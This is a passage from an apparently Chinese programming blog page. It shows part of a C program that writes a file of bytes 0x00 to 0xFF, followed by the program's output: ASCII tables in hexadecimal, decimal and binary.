<span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> templen=getLineLength(dpmode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;maxlen;i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(fmt,(<span class="keyword">unsigned</span> <span class="keyword">char</span>)buf[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dpmode == DMODE || dpmode==XMODE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(maxlen&lt;templen &amp;&amp; maxlen!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            printSpace((templen-maxlen),dpmode);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/// printf(&quot;\n&quot;);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//create test file with 0x00-0xff</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_datfile</span><span class="params">(<span class="keyword">char</span> * fname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> i=<span class="number">0</span>;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp=fopen(fname,<span class="string">&quot;wb+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;File creation error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;UCHAR_MAX;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fputc(i,fp);</span><br><span class="line">    &#125;</span><br><span class="line">    fputc(i,fp);</span><br><span class="line">    <span class="comment">//fputc(i-2,fp);</span></span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">NUL	SOH	STX	ETX	EOT	ENQ	ACK	BEL	BS	TAB	LF	VT	FF	CR	SO	SI</span><br><span class="line"><span class="number">00	01	02	03</span>	<span class="number">04	05	06	07</span>	<span class="number">08</span>	<span class="number">09</span>	<span class="number">0</span>a	<span class="number">0</span>b	<span class="number">0</span>c	<span class="number">0d</span>	<span class="number">0</span>e	<span class="number">0</span>f</span><br><span class="line"></span><br><span class="line">DLE	DC1	DC2	DC3	DC4	NAK	SYN	ETB	CAN	EM	SUB	ESC	FS	GS	RS	US</span><br><span class="line"><span class="number">10	11	12	13</span>	<span class="number">14	15	16	17</span>	<span class="number">18</span>	<span class="number">19</span>	<span class="number">1</span>a	<span class="number">1</span>b	<span class="number">1</span>c	<span class="number">1d</span>	<span class="number">1</span>e	<span class="number">1</span>f</span><br><span class="line"></span><br><span class="line">SP	!	&quot;	#	$	%	&amp;	&#x27;	(	)	*	+	,	-	.	/</span><br><span class="line"><span class="number">20	21	22	23</span>	<span class="number">24	25	26	27</span>	<span class="number">28</span>	<span class="number">29</span>	<span class="number">2</span>a	<span class="number">2</span>b	<span class="number">2</span>c	<span class="number">2d</span>	<span class="number">2</span>e	<span class="number">2</span>f</span><br><span class="line"></span><br><span class="line"><span class="number">0	1	2	3</span>	<span class="number">4	5	6	7</span>	<span class="number">8</span>	<span class="number">9</span>	:	<span class="comment">;	&lt;	=	&gt;	?</span></span><br><span class="line"><span class="number">30	31	32	33</span>	<span class="number">34	35	36	37</span>	<span class="number">38</span>	<span class="number">39</span>	<span class="number">3</span>a	<span class="number">3</span>b	<span class="number">3</span>c	<span class="number">3d</span>	<span class="number">3</span>e	<span class="number">3</span>f</span><br><span class="line"></span><br><span class="line">@	<span class="keyword">A</span>	B	C	D	E	F	G	H	I	J	K	L	M	N	O</span><br><span class="line"><span class="number">40	41	42	43</span>	<span class="number">44	45	46	47</span>	<span class="number">48</span>	<span class="number">49</span>	<span class="number">4</span>a	<span class="number">4</span>b	<span class="number">4</span>c	<span class="number">4d</span>	<span class="number">4</span>e	<span class="number">4</span>f</span><br><span class="line"></span><br><span class="line">P	Q	R	S	T	U	V	W	X	Y	Z	[	\	]	^	_</span><br><span class="line"><span class="number">50	51	52	53</span>	<span class="number">54	55	56	57</span>	<span class="number">58</span>	<span class="number">59</span>	<span class="number">5</span>a	<span class="number">5</span>b	<span class="number">5</span>c	<span class="number">5d</span>	<span class="number">5</span>e	<span class="number">5</span>f</span><br><span class="line"></span><br><span class="line">`	a	b	c	d	e	f	g	h	i	j	k	l	m	n	o</span><br><span class="line"><span class="number">60	61	62	63</span>	<span class="number">64	65	66	67</span>	<span class="number">68</span>	<span class="number">69</span>	<span class="number">6</span>a	<span class="number">6</span>b	<span class="number">6</span>c	<span class="number">6d</span>	<span class="number">6</span>e	<span class="number">6</span>f</span><br><span class="line"></span><br><span class="line">p	q	r	s	t	u	v	w	x	y	z	&#123;	|	&#125;	~	DEL</span><br><span class="line"><span class="number">70	71	72	73</span>	<span class="number">74	75	76	77</span>	<span class="number">78</span>	<span class="number">79</span>	<span class="number">7</span>a	<span class="number">7</span>b	<span class="number">7</span>c	<span class="number">7d</span>	<span class="number">7</span>e	<span class="number">7</span>f</span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line"><span class="number">80	81	82	83</span>	<span class="number">84	85	86	87</span>	<span class="number">88</span>	<span class="number">89</span>	<span class="number">8</span>a	<span class="number">8</span>b	<span class="number">8</span>c	<span class="number">8d</span>	<span class="number">8</span>e	<span class="number">8</span>f</span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line"><span class="number">90	91	92	93</span>	<span class="number">94	95	96	97</span>	<span class="number">98</span>	<span class="number">99</span>	<span class="number">9</span>a	<span class="number">9</span>b	<span class="number">9</span>c	<span class="number">9d</span>	<span class="number">9</span>e	<span class="number">9</span>f</span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line">a0	a1	a2	a3	a4	a5	a6	a7	a8	a9	aa	ab	ac	ad	ae	af</span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line">b0	b1	b2	b3	b4	b5	b6	b7	b8	b9	ba	bb	bc	bd	be	bf</span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line">c0	c1	c2	c3	c4	c5	c6	c7	c8	c9	ca	cb	cc	cd	ce	cf</span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line">d0	d1	d2	d3	d4	d5	d6	d7	d8	d9	da	db	dc	dd	de	df</span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line">e0	e1	e2	e3	e4	e5	e6	e7	e8	e9	ea	eb	ec	ed	ee	ef</span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line">f0	f1	f2	f3	f4	f5	f6	f7	f8	f9	fa	fb	fc	fd	fe	ff</span><br><span class="line"></span><br><span class="line"><span class="number">00</span>   <span class="number">01</span>   <span class="number">02</span>   <span class="number">03</span>   <span class="number">04</span>   <span class="number">05</span>   <span class="number">06</span>   <span class="number">07</span>   <span class="number">08</span>   <span class="number">09</span>   <span class="number">0</span>a   <span class="number">0</span>b   <span class="number">0</span>c   <span class="number">0d</span>   <span class="number">0</span>e   <span class="number">0</span>f     ????????????????</span><br><span class="line"></span><br><span class="line"><span class="number">10</span>   <span class="number">11</span>   <span class="number">12</span>   <span class="number">13</span>   <span class="number">14</span>   <span class="number">15</span>   <span class="number">16</span>   <span class="number">17</span>   <span class="number">18</span>   <span class="number">19</span>   <span class="number">1</span>a   <span class="number">1</span>b   <span class="number">1</span>c   <span class="number">1d</span>   <span class="number">1</span>e   <span class="number">1</span>f     ????????????????</span><br><span class="line"></span><br><span class="line"><span class="number">20</span>   <span class="number">21</span>   <span class="number">22</span>   <span class="number">23</span>   <span class="number">24</span>   <span class="number">25</span>   <span class="number">26</span>   <span class="number">27</span>   <span class="number">28</span>   <span class="number">29</span>   <span class="number">2</span>a   <span class="number">2</span>b   <span class="number">2</span>c   <span class="number">2d</span>   <span class="number">2</span>e   <span class="number">2</span>f     ?!&quot;#$%&amp;&#x27;()*+,-./</span><br><span class="line"></span><br><span class="line"><span class="number">30</span>   <span class="number">31</span>   <span class="number">32</span>   <span class="number">33</span>   <span class="number">34</span>   <span class="number">35</span>   <span class="number">36</span>   <span class="number">37</span>   <span class="number">38</span>   <span class="number">39</span>   <span class="number">3</span>a   <span class="number">3</span>b   <span class="number">3</span>c   <span class="number">3d</span>   <span class="number">3</span>e   <span class="number">3</span>f     <span class="number">0123456789</span>:<span class="comment">;&lt;=&gt;?</span></span><br><span class="line"></span><br><span class="line"><span class="number">40</span>   <span class="number">41</span>   <span class="number">42</span>   <span class="number">43</span>   <span class="number">44</span>   <span class="number">45</span>   <span class="number">46</span>   <span class="number">47</span>   <span class="number">48</span>   <span class="number">49</span>   <span class="number">4</span>a   <span class="number">4</span>b   <span class="number">4</span>c   <span class="number">4d</span>   <span class="number">4</span>e   <span class="number">4</span>f     @ABCDEFGHIJKLMNO</span><br><span class="line"></span><br><span class="line"><span class="number">50</span>   <span class="number">51</span>   <span class="number">52</span>   <span class="number">53</span>   <span class="number">54</span>   <span class="number">55</span>   <span class="number">56</span>   <span class="number">57</span>   <span class="number">58</span>   <span class="number">59</span>   <span class="number">5</span>a   <span class="number">5</span>b   <span class="number">5</span>c   <span class="number">5d</span>   <span class="number">5</span>e   <span class="number">5</span>f     PQRSTUVWXYZ[\]^_</span><br><span class="line"></span><br><span class="line"><span class="number">60</span>   <span class="number">61</span>   <span class="number">62</span>   <span class="number">63</span>   <span class="number">64</span>   <span class="number">65</span>   <span class="number">66</span>   <span class="number">67</span>   <span class="number">68</span>   <span class="number">69</span>   <span class="number">6</span>a   <span class="number">6</span>b   <span class="number">6</span>c   <span class="number">6d</span>   <span class="number">6</span>e   <span class="number">6</span>f     `abcdefghijklmno</span><br><span class="line"></span><br><span class="line"><span class="number">70</span>   <span class="number">71</span>   <span class="number">72</span>   <span class="number">73</span>   <span class="number">74</span>   <span class="number">75</span>   <span class="number">76</span>   <span class="number">77</span>   <span class="number">78</span>   <span class="number">79</span>   <span class="number">7</span>a   <span class="number">7</span>b   <span class="number">7</span>c   <span class="number">7d</span>   <span class="number">7</span>e   <span class="number">7</span>f     pqrstuvwxyz&#123;|&#125;~?</span><br><span class="line"></span><br><span class="line"><span class="number">80</span>   <span class="number">81</span>   <span class="number">82</span>   <span class="number">83</span>   <span class="number">84</span>   <span class="number">85</span>   <span class="number">86</span>   <span class="number">87</span>   <span class="number">88</span>   <span class="number">89</span>   <span class="number">8</span>a   <span class="number">8</span>b   <span class="number">8</span>c   <span class="number">8d</span>   <span class="number">8</span>e   <span class="number">8</span>f     ????????????????</span><br><span class="line"></span><br><span class="line"><span class="number">90</span>   <span class="number">91</span>   <span class="number">92</span>   <span class="number">93</span>   <span class="number">94</span>   <span class="number">95</span>   <span class="number">96</span>   <span class="number">97</span>   <span class="number">98</span>   <span class="number">99</span>   <span class="number">9</span>a   <span class="number">9</span>b   <span class="number">9</span>c   <span class="number">9d</span>   <span class="number">9</span>e   <span class="number">9</span>f     ????????????????</span><br><span class="line"></span><br><span class="line">a0   a1   a2   a3   a4   a5   a6   a7   a8   a9   aa   ab   ac   ad   ae   af     ????????????????</span><br><span class="line"></span><br><span class="line">b0   b1   b2   b3   b4   b5   b6   b7   b8   b9   ba   bb   bc   bd   be   bf     ????????????????</span><br><span class="line"></span><br><span class="line">c0   c1   c2   c3   c4   c5   c6   c7   c8   c9   ca   cb   cc   cd   ce   cf     ????????????????</span><br><span class="line"></span><br><span class="line">d0   d1   d2   d3   d4   d5   d6   d7   d8   d9   da   db   dc   dd   de   df     ????????????????</span><br><span class="line"></span><br><span class="line">e0   e1   e2   e3   e4   e5   e6   e7   e8   e9   ea   eb   ec   ed   ee   ef     ????????????????</span><br><span class="line"></span><br><span class="line">f0   f1   f2   f3   f4   f5   f6   f7   f8   f9   fa   fb   fc   fd   fe   ff     ????????????????</span><br><span class="line"></span><br><span class="line">NUL	SOH	STX	ETX	EOT	ENQ	ACK	BEL	BS	TAB	LF	VT	FF	CR	SO	SI</span><br><span class="line"><span class="number">000	001</span>	<span class="number">002	003</span>	<span class="number">004	005</span>	<span class="number">006	007</span>	<span class="number">008	009</span>	<span class="number">010	011</span>	<span class="number">012	013</span>	<span class="number">014	015</span></span><br><span class="line"></span><br><span class="line">DLE	DC1	DC2	DC3	DC4	NAK	SYN	ETB	CAN	EM	SUB	ESC	FS	GS	RS	US</span><br><span class="line"><span class="number">016	017</span>	<span class="number">018	019</span>	<span class="number">020	021</span>	<span class="number">022	023</span>	<span class="number">024	025</span>	<span class="number">026	027</span>	<span class="number">028	029</span>	<span class="number">030	031</span></span><br><span class="line"></span><br><span class="line">SP	!	&quot;	#	$	%	&amp;	&#x27;	(	)	*	+	,	-	.	/</span><br><span class="line"><span class="number">032	033</span>	<span class="number">034	035</span>	<span class="number">036	037</span>	<span class="number">038	039</span>	<span class="number">040	041</span>	<span class="number">042	043</span>	<span class="number">044	045</span>	<span class="number">046	047</span></span><br><span class="line"></span><br><span class="line"><span class="number">0	1	2	3</span>	<span class="number">4	5	6	7</span>	<span class="number">8</span>	<span class="number">9</span>	:	<span class="comment">;	&lt;	=	&gt;	?</span></span><br><span class="line"><span class="number">048	049</span>	<span class="number">050	051</span>	<span class="number">052	053</span>	<span class="number">054	055</span>	<span class="number">056	057</span>	<span class="number">058	059</span>	<span class="number">060	061</span>	<span class="number">062	063</span></span><br><span class="line"></span><br><span class="line">@	<span class="keyword">A</span>	B	C	D	E	F	G	H	I	J	K	L	M	N	O</span><br><span class="line"><span class="number">064	065</span>	<span class="number">066	067</span>	<span class="number">068	069</span>	<span class="number">070	071</span>	<span class="number">072	073</span>	<span class="number">074	075</span>	<span class="number">076	077</span>	<span class="number">078	079</span></span><br><span class="line"></span><br><span class="line">P	Q	R	S	T	U	V	W	X	Y	Z	[	\	]	^	_</span><br><span class="line"><span class="number">080	081</span>	<span class="number">082	083</span>	<span class="number">084	085</span>	<span class="number">086	087</span>	<span class="number">088	089</span>	<span class="number">090	091</span>	<span class="number">092	093</span>	<span class="number">094	095</span></span><br><span class="line"></span><br><span class="line">`	a	b	c	d	e	f	g	h	i	j	k	l	m	n	o</span><br><span class="line"><span class="number">096	097</span>	<span class="number">098	099</span>	<span class="number">100	101	102	103</span>	<span class="number">104	105	106	107</span>	<span class="number">108	109	110	111</span></span><br><span class="line"></span><br><span class="line">p	q	r	s	t	u	v	w	x	y	z	&#123;	|	&#125;	~	DEL</span><br><span class="line"><span class="number">112	113	114	115</span>	<span class="number">116	117	118	119</span>	<span class="number">120	121	122	123</span>	<span class="number">124	125	126	127</span></span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line"><span class="number">128	129	130	131</span>	<span class="number">132	133	134	135</span>	<span class="number">136	137	138	139</span>	<span class="number">140	141	142	143</span></span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line"><span class="number">144	145	146	147</span>	<span class="number">148	149	150	151</span>	<span class="number">152	153	154	155</span>	<span class="number">156	157	158	159</span></span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line"><span class="number">160	161	162	163</span>	<span class="number">164	165	166	167</span>	<span class="number">168	169	170	171</span>	<span class="number">172	173	174	175</span></span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line"><span class="number">176	177	178	179</span>	<span class="number">180	181	182	183</span>	<span class="number">184	185	186	187</span>	<span class="number">188	189	190	191</span></span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line"><span class="number">192	193	194	195</span>	<span class="number">196	197	198	199</span>	<span class="number">200	201	202	203</span>	<span class="number">204	205	206	207</span></span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line"><span class="number">208	209	210	211</span>	<span class="number">212	213	214	215</span>	<span class="number">216	217	218	219</span>	<span class="number">220	221	222	223</span></span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line"><span class="number">224	225	226	227</span>	<span class="number">228	229	230	231</span>	<span class="number">232	233	234	235</span>	<span class="number">236	237	238	239</span></span><br><span class="line"></span><br><span class="line">?	?	?	?	?	?	?	?	?	?	?	?	?	?	?	?</span><br><span class="line"><span class="number">240	241	242	243</span>	<span class="number">244	245	246	247</span>	<span class="number">248	249	250	251</span>	<span class="number">252	253	254	255</span></span><br><span class="line"></span><br><span class="line"><span class="number">000</span>  <span class="number">001</span>  <span class="number">002</span>  <span class="number">003</span>  <span class="number">004</span>  <span class="number">005</span>  <span class="number">006</span>  <span class="number">007</span>  <span class="number">008</span>  <span class="number">009</span>  <span class="number">010</span>  <span class="number">011</span>  <span class="number">012</span>  <span class="number">013</span>  <span class="number">014</span>  <span class="number">015</span>    ????????????????</span><br><span class="line"></span><br><span class="line"><span class="number">016</span>  <span class="number">017</span>  <span class="number">018</span>  <span class="number">019</span>  <span class="number">020</span>  <span class="number">021</span>  <span class="number">022</span>  <span class="number">023</span>  <span class="number">024</span>  <span class="number">025</span>  <span class="number">026</span>  <span class="number">027</span>  <span class="number">028</span>  <span class="number">029</span>  <span class="number">030</span>  <span class="number">031</span>    ????????????????</span><br><span class="line"></span><br><span class="line"><span class="number">032</span>  <span class="number">033</span>  <span class="number">034</span>  <span class="number">035</span>  <span class="number">036</span>  <span class="number">037</span>  <span class="number">038</span>  <span class="number">039</span>  <span class="number">040</span>  <span class="number">041</span>  <span class="number">042</span>  <span class="number">043</span>  <span class="number">044</span>  <span class="number">045</span>  <span class="number">046</span>  <span class="number">047</span>    ?!&quot;#$%&amp;&#x27;()*+,-./</span><br><span class="line"></span><br><span class="line"><span class="number">048</span>  <span class="number">049</span>  <span class="number">050</span>  <span class="number">051</span>  <span class="number">052</span>  <span class="number">053</span>  <span class="number">054</span>  <span class="number">055</span>  <span class="number">056</span>  <span class="number">057</span>  <span class="number">058</span>  <span class="number">059</span>  <span class="number">060</span>  <span class="number">061</span>  <span class="number">062</span>  <span class="number">063</span>    <span class="number">0123456789</span>:<span class="comment">;&lt;=&gt;?</span></span><br><span class="line"></span><br><span class="line"><span class="number">064</span>  <span class="number">065</span>  <span class="number">066</span>  <span class="number">067</span>  <span class="number">068</span>  <span class="number">069</span>  <span class="number">070</span>  <span class="number">071</span>  <span class="number">072</span>  <span class="number">073</span>  <span class="number">074</span>  <span class="number">075</span>  <span class="number">076</span>  <span class="number">077</span>  <span class="number">078</span>  <span class="number">079</span>    @ABCDEFGHIJKLMNO</span><br><span class="line"></span><br><span class="line"><span class="number">080</span>  <span class="number">081</span>  <span class="number">082</span>  <span class="number">083</span>  <span class="number">084</span>  <span class="number">085</span>  <span class="number">086</span>  <span class="number">087</span>  <span class="number">088</span>  <span class="number">089</span>  <span class="number">090</span>  <span class="number">091</span>  <span class="number">092</span>  <span class="number">093</span>  <span class="number">094</span>  <span class="number">095</span>    PQRSTUVWXYZ[\]^_</span><br><span class="line"></span><br><span class="line"><span class="number">096</span>  <span class="number">097</span>  <span class="number">098</span>  <span class="number">099</span>  <span class="number">100</span>  <span class="number">101</span>  <span class="number">102</span>  <span class="number">103</span>  <span class="number">104</span>  <span class="number">105</span>  <span class="number">106</span>  <span class="number">107</span>  <span class="number">108</span>  <span class="number">109</span>  <span class="number">110</span>  <span class="number">111</span>    `abcdefghijklmno</span><br><span class="line"></span><br><span class="line"><span class="number">112</span>  <span class="number">113</span>  <span class="number">114</span>  <span class="number">115</span>  <span class="number">116</span>  <span class="number">117</span>  <span class="number">118</span>  <span class="number">119</span>  <span class="number">120</span>  <span class="number">121</span>  <span class="number">122</span>  <span class="number">123</span>  <span class="number">124</span>  <span class="number">125</span>  <span class="number">126</span>  <span class="number">127</span>    pqrstuvwxyz&#123;|&#125;~?</span><br><span class="line"></span><br><span class="line"><span class="number">128</span>  <span class="number">129</span>  <span class="number">130</span>  <span class="number">131</span>  <span class="number">132</span>  <span class="number">133</span>  <span class="number">134</span>  <span class="number">135</span>  <span class="number">136</span>  <span class="number">137</span>  <span class="number">138</span>  <span class="number">139</span>  <span class="number">140</span>  <span class="number">141</span>  <span class="number">142</span>  <span class="number">143</span>    ????????????????</span><br><span class="line"></span><br><span class="line"><span class="number">144</span>  <span class="number">145</span>  <span class="number">146</span>  <span class="number">147</span>  <span class="number">148</span>  <span class="number">149</span>  <span class="number">150</span>  <span class="number">151</span>  <span class="number">152</span>  <span class="number">153</span>  <span class="number">154</span>  <span class="number">155</span>  <span class="number">156</span>  <span class="number">157</span>  <span class="number">158</span>  <span class="number">159</span>    ????????????????</span><br><span class="line"></span><br><span class="line"><span class="number">160</span>  <span class="number">161</span>  <span class="number">162</span>  <span class="number">163</span>  <span class="number">164</span>  <span class="number">165</span>  <span class="number">166</span>  <span class="number">167</span>  <span class="number">168</span>  <span class="number">169</span>  <span class="number">170</span>  <span class="number">171</span>  <span class="number">172</span>  <span class="number">173</span>  <span class="number">174</span>  <span class="number">175</span>    ????????????????</span><br><span class="line"></span><br><span class="line"><span class="number">176</span>  <span class="number">177</span>  <span class="number">178</span>  <span class="number">179</span>  <span class="number">180</span>  <span class="number">181</span>  <span class="number">182</span>  <span class="number">183</span>  <span class="number">184</span>  <span class="number">185</span>  <span class="number">186</span>  <span class="number">187</span>  <span class="number">188</span>  <span class="number">189</span>  <span class="number">190</span>  <span class="number">191</span>    ????????????????</span><br><span class="line"></span><br><span class="line"><span class="number">192</span>  <span class="number">193</span>  <span class="number">194</span>  <span class="number">195</span>  <span class="number">196</span>  <span class="number">197</span>  <span class="number">198</span>  <span class="number">199</span>  <span class="number">200</span>  <span class="number">201</span>  <span class="number">202</span>  <span class="number">203</span>  <span class="number">204</span>  <span class="number">205</span>  <span class="number">206</span>  <span class="number">207</span>    ????????????????</span><br><span class="line"></span><br><span class="line"><span class="number">208</span>  <span class="number">209</span>  <span class="number">210</span>  <span class="number">211</span>  <span class="number">212</span>  <span class="number">213</span>  <span class="number">214</span>  <span class="number">215</span>  <span class="number">216</span>  <span class="number">217</span>  <span class="number">218</span>  <span class="number">219</span>  <span class="number">220</span>  <span class="number">221</span>  <span class="number">222</span>  <span class="number">223</span>    ????????????????</span><br><span class="line"></span><br><span class="line"><span class="number">224</span>  <span class="number">225</span>  <span class="number">226</span>  <span class="number">227</span>  <span class="number">228</span>  <span class="number">229</span>  <span class="number">230</span>  <span class="number">231</span>  <span class="number">232</span>  <span class="number">233</span>  <span class="number">234</span>  <span class="number">235</span>  <span class="number">236</span>  <span class="number">237</span>  <span class="number">238</span>  <span class="number">239</span>    ????????????????</span><br><span class="line"></span><br><span class="line"><span class="number">240</span>  <span class="number">241</span>  <span class="number">242</span>  <span class="number">243</span>  <span class="number">244</span>  <span class="number">245</span>  <span class="number">246</span>  <span class="number">247</span>  <span class="number">248</span>  <span class="number">249</span>  <span class="number">250</span>  <span class="number">251</span>  <span class="number">252</span>  <span class="number">253</span>  <span class="number">254</span>  <span class="number">255</span>    ????????????????</span><br><span class="line"></span><br><span class="line">NUL		SOH		STX		ETX</span><br><span class="line"><span class="number">00000000</span>	<span class="number">00000001</span>	<span class="number">00000010</span>	<span class="number">00000011</span></span><br><span class="line"></span><br><span class="line">EOT		ENQ		ACK		BEL</span><br><span class="line"><span class="number">00000100</span>	<span class="number">00000101</span>	<span class="number">00000110</span>	<span class="number">00000111</span></span><br><span class="line"></span><br><span class="line">BS		TAB		LF		VT</span><br><span class="line"><span class="number">00001000</span>	<span class="number">00001001</span>	<span class="number">00001010</span>	<span class="number">00001011</span></span><br><span class="line"></span><br><span class="line">FF		CR		SO		SI</span><br><span class="line"><span class="number">00001100</span>	<span class="number">00001101</span>	<span class="number">00001110</span>	<span class="number">00001111</span></span><br><span class="line"></span><br><span class="line">DLE		DC1		DC2		DC3</span><br><span class="line"><span class="number">00010000</span>	<span class="number">00010001</span>	<span class="number">00010010</span>	<span class="number">00010011</span></span><br><span class="line"></span><br><span class="line">DC4		NAK		SYN		ETB</span><br><span class="line"><span class="number">00010100</span>	<span class="number">00010101</span>	<span class="number">00010110</span>	<span class="number">00010111</span></span><br><span class="line"></span><br><span class="line">CAN		EM		SUB		ESC</span><br><span class="line"><span class="number">00011000</span>	<span class="number">00011001</span>	<span class="number">00011010</span>	<span class="number">00011011</span></span><br><span class="line"></span><br><span class="line">FS		GS		RS		US</span><br><span class="line"><span class="number">00011100</span>	<span class="number">00011101</span>	<span class="number">00011110</span>	<span class="number">00011111</span></span><br><span class="line"></span><br><span class="line">SP		!		&quot;		#</span><br><span class="line"><span class="number">00100000</span>	<span class="number">00100001</span>	<span class="number">00100010</span>	<span class="number">00100011</span></span><br><span class="line"></span><br><span class="line">$		%		&amp;		&#x27;</span><br><span class="line"><span class="number">00100100</span>	<span class="number">00100101</span>	<span class="number">00100110</span>	<span class="number">00100111</span></span><br><span class="line"></span><br><span class="line">(		)		*		+</span><br><span class="line"><span class="number">00101000</span>	<span class="number">00101001</span>	<span class="number">00101010</span>	<span class="number">00101011</span></span><br><span class="line"></span><br><span class="line">,		-		.		/</span><br><span class="line"><span class="number">00101100</span>	<span class="number">00101101</span>	<span class="number">00101110</span>	<span class="number">00101111</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>		<span class="number">1</span>		<span class="number">2</span>		<span class="number">3</span></span><br><span class="line"><span class="number">00110000</span>	<span class="number">00110001</span>	<span class="number">00110010</span>	<span class="number">00110011</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>		<span class="number">5</span>		<span class="number">6</span>		<span class="number">7</span></span><br><span class="line"><span class="number">00110100</span>	<span class="number">00110101</span>	<span class="number">00110110</span>	<span class="number">00110111</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>		<span class="number">9</span>		:		<span class="comment">;</span></span><br><span class="line"><span class="number">00111000</span>	<span class="number">00111001</span>	<span class="number">00111010</span>	<span class="number">00111011</span></span><br><span class="line"></span><br><span class="line">&lt;		=		&gt;		?</span><br><span class="line"><span class="number">00111100</span>	<span class="number">00111101</span>	<span class="number">00111110</span>	<span class="number">00111111</span></span><br><span class="line"></span><br><span class="line">@		<span class="keyword">A</span>		B		C</span><br><span class="line"><span class="number">01000000</span>	<span class="number">01000001</span>	<span class="number">01000010</span>	<span class="number">01000011</span></span><br><span class="line"></span><br><span class="line">D		E		F		G</span><br><span class="line"><span class="number">01000100</span>	<span class="number">01000101</span>	<span class="number">01000110</span>	<span class="number">01000111</span></span><br><span class="line"></span><br><span class="line">H		I		J		K</span><br><span class="line"><span class="number">01001000</span>	<span class="number">01001001</span>	<span class="number">01001010</span>	<span class="number">01001011</span></span><br><span class="line"></span><br><span class="line">L		M		N		O</span><br><span class="line"><span class="number">01001100</span>	<span class="number">01001101</span>	<span class="number">01001110</span>	<span class="number">01001111</span></span><br><span class="line"></span><br><span class="line">P		Q		R		S</span><br><span class="line"><span class="number">01010000</span>	<span class="number">01010001</span>	<span class="number">01010010</span>	<span class="number">01010011</span></span><br><span class="line"></span><br><span class="line">T		U		V		W</span><br><span class="line"><span class="number">01010100</span>	<span class="number">01010101</span>	<span class="number">01010110</span>	<span class="number">01010111</span></span><br><span class="line"></span><br><span class="line">X		Y		Z		[</span><br><span class="line"><span class="number">01011000</span>	<span class="number">01011001</span>	<span class="number">01011010</span>	<span class="number">01011011</span></span><br><span class="line"></span><br><span class="line">\		]		^		_</span><br><span class="line"><span class="number">01011100</span>	<span class="number">01011101</span>	<span class="number">01011110</span>	<span class="number">01011111</span></span><br><span class="line"></span><br><span class="line">`		a		b		c</span><br><span class="line"><span class="number">01100000</span>	<span class="number">01100001</span>	<span class="number">01100010</span>	<span class="number">01100011</span></span><br><span class="line"></span><br><span class="line">d		e		f		g</span><br><span class="line"><span class="number">01100100</span>	<span class="number">01100101</span>	<span class="number">01100110</span>	<span class="number">01100111</span></span><br><span class="line"></span><br><span class="line">h		i		j		k</span><br><span class="line"><span class="number">01101000</span>	<span class="number">01101001</span>	<span class="number">01101010</span>	<span class="number">01101011</span></span><br><span class="line"></span><br><span class="line">l		m		n		o</span><br><span class="line"><span class="number">01101100</span>	<span class="number">01101101</span>	<span class="number">01101110</span>	<span class="number">01101111</span></span><br><span class="line"></span><br><span class="line">p		q		r		s</span><br><span class="line"><span class="number">01110000</span>	<span class="number">01110001</span>	<span class="number">01110010</span>	<span class="number">01110011</span></span><br><span class="line"></span><br><span class="line">t		u		v		w</span><br><span class="line"><span class="number">01110100</span>	<span class="number">01110101</span>	<span class="number">01110110</span>	<span class="number">01110111</span></span><br><span class="line"></span><br><span class="line">x		y		z		&#123;</span><br><span class="line"><span class="number">01111000</span>	<span class="number">01111001</span>	<span class="number">01111010</span>	<span class="number">01111011</span></span><br><span class="line"></span><br><span class="line">|		&#125;		~		